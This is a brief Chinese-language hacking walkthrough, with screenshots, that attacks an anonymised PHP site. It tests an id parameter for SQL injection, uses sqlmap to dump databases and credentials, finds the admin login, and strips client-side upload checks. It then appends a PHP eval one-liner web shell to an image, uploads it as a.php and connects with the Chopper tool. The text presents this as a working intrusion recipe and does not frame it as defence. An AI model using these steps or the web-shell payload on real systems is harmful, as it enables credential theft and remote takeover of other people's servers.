1.找注入点  
![](../Images/920cc86ca0ac511c9981deb00c519363.png)  
2.测试是否有注入：

*   

```
`http://xxxxxx/xxxx.php?id=6’ ,没有回显`
```

![](../Images/9b8c3cbf65d56a166e913bfa22d327d5.png)  
输入：http://xxxxxx/xxxx.php?id=6 and 1=1 有回显，and 1 = 2没有回显，说明存在注入。  
3\. 使用sqlmap跑。

*   

```
`sqlmap.py -u “http://xxxxx/xxxx.php?id=6”`
```

![](../Images/bf64bdcc49bf66a21e9d4e2f78647a52.png)  
发现有注入，然后使用–dbs，–tables，–columns，–dump找出用户名和密码。  
4.使用御剑扫描后台。然后进行登录。![](../Images/4baff7460d90a2644a72fd595ed451f0.png)  
我们先上传一个脚本木马试试。![](../Images/23e493397872852e92e61eeec4d414c3.png)  
发现有黑名单。先看下是否是本地js校验。右键审查元素，发现是本地js校验。![](../Images/89dba351978a7bc0424c0c6f4fcd41c2.png)  
我们找到表单form，删除相对应的脚本。![](../Images/7f83a113f850518d4d2ec746d7f32661.png)  
5.重新上传php一句话，发现![](../Images/ebc260e91136bbf4935ee724d46ef29d.png)  
那么试下图片马  
6.将图片使用C32Asm打开，在最后面添加一句话：<?php @ eval ( $\_POST \[ 'pw' \]); ?>![](../Images/35659cd5f74909eaa27e158a430a70d5.png)![](../Images/a65f96e3beafbbef8390eb935b844c77.png)  
保存，命名为a.php。然后上传，发现上传成功，使用菜刀连接，密码pw。![](../Images/1f8e7a09e48fbdc4d9a509e11986302d.png)
